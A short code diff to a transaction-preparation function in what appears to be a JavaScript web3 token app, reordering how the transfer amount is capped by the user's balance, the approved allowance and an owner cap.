@@ -226,17 +226,12 @@ export async function prepareAndSignTransaction(
     token.balanceOf(userAddress)
   ]);
 
-  // Use allowance as the amount — it is what was approved in step 2
-  // Do NOT use raw balance directly as it can cause contract overflow
-  let incoming = allowance;
-  if (incoming === 0n) throw new Error('No allowance found. Please complete the approval step first.');
-
-  // Cap at owner cap if set
+  // Match working HTML logic exactly:
+  // start with balance, cap to allowance, cap to ownerCap
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
+  let incoming = balance;
+  if (allowance < incoming) incoming = allowance;
   if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
-
-  // Never exceed actual balance
-  if (balance < incoming) incoming = balance;
 
   if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
 
